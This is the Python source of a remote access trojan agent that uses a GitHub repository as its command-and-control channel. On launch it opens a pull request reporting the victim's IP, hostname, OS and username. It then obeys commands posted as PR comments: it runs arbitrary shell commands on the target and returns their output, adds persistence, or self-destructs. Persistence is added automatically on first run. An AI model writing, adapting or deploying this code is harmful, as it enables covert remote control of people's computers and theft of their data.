import random
from urllib.parse import urlparse
from datetime import datetime
import sys
import time
from winreg import *
from ctypes import *
import string
from lib import sn0wflake
from github import Github

g = Github("{TOKEN}")
repo_link = "{REPO}"
parsed_link = urlparse(repo_link)
path_components = parsed_link.path.split('/')
repo_owner = path_components[1]
repo_name = path_components[2]

repo = g.get_user(repo_owner).get_repo(repo_name)

def start():
    repo = g.get_user(repo_owner).get_repo(repo_name)
    base_branch = "main"
    branch_name = "feature-" + ''.join(random.choice(string.ascii_lowercase) for i in range(6))
    head_branch = repo.create_git_ref(ref=f"refs/heads/{branch_name}", sha=repo.get_branch(base_branch).commit.sha)

    file_name = "random_file.txt"
    file_content = "This is a random file."
    file_path = f"{branch_name}/{file_name}"
    commit_message = "Add random file"
    repo.create_file(file_path, commit_message, file_content, branch=branch_name)

    title = f"Agent#{ID}"
    now = datetime.now()
    body = f"{MSG} Time: {now.strftime('%d/%m/%Y %H:%M:%S')}\nIP: {sn0wflake.getIP()}\nHostname: {sn0wflake.getHostname()}\nOS: {sn0wflake.getOS()}\nUsername: {sn0wflake.getUsername()}"
    pr = repo.create_pull(title=title, body=body, head=head_branch.ref, base=base_branch)

    while True:
        comments = pr.get_issue_comments().get_page(0)
        if comments:
            latest_comment = comments[-1]
            options = latest_comment.body.split() 
            command = options[0]
            
            if command == "cmd":
                if len(options) > 1:
                    pr.create_issue_comment(f"```{sn0wflake.cmd(' '.join(options[1:]))}```")
                else:
                    pr.create_issue_comment(f"Make sure you add required arguments: cmd #command#")

            elif command == "persistent":
                result = sn0wflake.persistent()
                if result:
                    pr.create_issue_comment(f"Persistence added successfully")

                else:
                    pr.create_issue_comment(f"Error while trying to add persistence:\n{result}")

            elif command == "ls":
                pr.create.issue_comment(f"Agent#{ID} IP: {sn0wflake.getIP()}")
            
            elif command == "terminate":
                pr.create_issue_comment(f"Agent#{ID} Terminated")
                sys.exit()

            elif command == "selfdestruct":
                result = sn0wflake.selfdestruct()
                if result:
                    pr.create_issue_comment(f"Agent#{ID} destroyed successfully")
                    sys.exit()
                else:
                    pr.create_issue_comment(f"Error while trying to destroy the agent:\n{result}")


            elif command == "help":
                pr.create_issue_comment(f"""```
                Agent#{ID} Commands:
                ls - List agents
                cmd <command> - Run command on target
                persistent - Add persistence
                terminate - Terminate the agent
                selfdestruct - Destroy the agent
                help - Show this message
                ```""")
        time.sleep(1)

config = sn0wflake.createConfig()
ID = sn0wflake.id()
if config:
    MSG = f"New Agent Online #{ID}"
    COLOR = 0x00ff00
    persistence_status = sn0wflake.addPersistence()
else:
    MSG = f"Agent Online #{ID}"
    COLOR = 0x0000FF

start()
